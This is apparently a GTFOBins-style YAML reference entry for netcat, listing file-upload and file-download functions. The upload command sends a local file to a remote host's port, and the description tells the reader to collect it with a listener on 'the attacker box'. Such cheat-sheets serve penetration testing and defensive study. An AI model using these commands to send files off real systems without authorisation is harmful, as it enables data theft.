---
functions:
  file-upload:
    - description: Send a local file via TCP. Run `nc -l -p 4444 > "file_to_save"` on the attacker box to collect the file.
      code: |
        nc $RHOST $RPORT < "$LFILE"
  file-download:
    - description: Fetch a remote file via TCP. Run `nc target.com 4444 < "file_to_send"` on the attacker box to send the file.
      code: |
        nc -l -p $LPORT > "$LFILE"
---
